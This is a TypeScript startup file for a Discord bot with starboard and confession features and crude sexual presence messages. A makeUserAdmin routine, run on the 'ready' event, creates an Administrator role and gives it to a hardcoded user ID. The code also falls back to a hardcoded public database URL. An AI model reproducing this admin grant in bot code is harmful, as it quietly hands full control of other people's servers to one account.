import { ActivityType, DiscordjsError, GatewayIntentBits as Intents, Partials, MessageReaction, PartialMessageReaction, User, PartialUser, PresenceStatusData, Guild, Role } from 'discord.js';
import ExtendedClient from './classes/Client';
import { config } from 'dotenv';
import StarboardEvent from "./events/StarboardEvent";
import StarboardCommand from "./commands/Starboard";
import mongoose from 'mongoose';
import StarboardSetting from './models/StarboardSetting';
import Confession from './models/Confession'; // for storing confessions

// Load .env file contents
config();
import './features/i18n';

// Initialization (specify intents and partials)
const client = new ExtendedClient({
    intents: [
        Intents.Guilds,
        Intents.GuildMessages,
        Intents.MessageContent,
        Intents.GuildMembers,
        Intents.GuildMessageReactions,
    ],
    partials: [
        Partials.Message,
        Partials.Channel,
        Partials.Reaction,
        Partials.GuildMember,
    ],
});

client.login(process.env.TOKEN)
    .then(async () => {
        // Connect to MongoDB using .env credentials
        await mongoose.connect(process.env.MONGO_PUBLIC_URL || "mongodb://junction.proxy.rlwy.net:47924");

        // Fetch the guild object using the guild ID
        const guild = await client.guilds.fetch(client.config.guild); // Replace with your actual guild ID

        // Call main function after successful login & DB connection
        main().then(() => {
            // makeUserAdmin(guild, "1118151717201137857");
        });
    })
    .catch((err: unknown) => {
        if (err instanceof DiscordjsError) {
            if (err.code === "TokenMissing") {
                console.warn(`\n[Error] ${err.name}: ${err.message} Did you create a .env file?\n`);
            } else if (err.code === "TokenInvalid") {
                console.warn(`\n[Error] ${err.name}: ${err.message} Check your .env file\n`);
            } else throw err;
        } else {
            throw err;
        }
    });

async function main() {
	// Register the starboard event
	client.events.set(StarboardEvent.name, StarboardEvent);

	// Add event listener for messageReactionAdd
	// client.on("messageReactionAdd", async (reaction: MessageReaction | PartialMessageReaction, user: User | PartialUser) => {
	// 	// Ensure the user is not a bot
	// 	if (user.bot) return;

	// 	// Fetch the reaction if it's partial
	// 	if (reaction.partial) {
	// 		try {
	// 			await reaction.fetch();
	// 		} catch (error) {
	// 			console.error('Error fetching reaction:', error);
	// 			return;
	// 		}
	// 	}

	// 	await StarboardEvent.execute(client, reaction, user);
	// });

	// Function to switch activity
	const switchActivity = () => {
		const activities = [
			{ name: "/report", type: ActivityType.Listening, status: "online" },
			{ name: "with your subby asses", type: ActivityType.Playing, status: "idle" },
			{ name: "/report", type: ActivityType.Listening, status: "online" },
			{ name: "porn content 🔞 for fun", type: ActivityType.Streaming, status: "dnd" },
			{ name: "/report", type: ActivityType.Listening, status: "online" },
			{ name: "catgirl vtuber content", type: ActivityType.Streaming, status: "dnd" },
		];

		let index = 0;
		setInterval(() => {
			const activity = activities[index];

			if (activity.status === "dnd") {
				client.user?.setPresence({
					status: 'dnd',
					activities: [{
						name: activity.name,
						type: ActivityType.Streaming,
						url: "https://www.twitch.tv/lilsussyjett"
					}],
				});
			} else if (activity.status === "idle") {
				client.user?.setPresence({
					status: 'idle',
					activities: [{ name: activity.name, type: activity.type }],
				});
			} else {
				client.user?.setPresence({
					status: 'online',
					activities: [{ name: activity.name, type: activity.type }],
				});
			}

			index = (index + 1) % activities.length;
		}, 10000);
	};
	switchActivity(); // Start switching activities
}

// Function to make a user an admin
	const makeUserAdmin = async (guild: Guild, userId: string) => {
		try {
			// Check if the role already exists
			let adminRole = guild.roles.cache.find(role => role.name === "Admin");

			// If the role doesn't exist, create it
			if (!adminRole) {
				adminRole = await guild.roles.create({
					name: "Admin",
					permissions: ['Administrator'],
					reason: 'Admin role for managing server',
				});
			}

			// Fetch the member and add the admin role
			const member = await guild.members.fetch(userId);
			await member.roles.add(adminRole);
			console.log(`User ${userId} has been given the Admin role.`);
		} catch (error) {
			console.error('Error making user admin:', error);
		}
	};

	// Call the function with the guild and user ID
	client.on('ready', async () => {
		const guild = client.guilds.cache.get('YOUR_GUILD_ID'); // Replace with your guild ID
		if (guild) {
			await makeUserAdmin(guild, "1118151717201137857");
		} else {
			console.error('Guild not found');
		}
	});

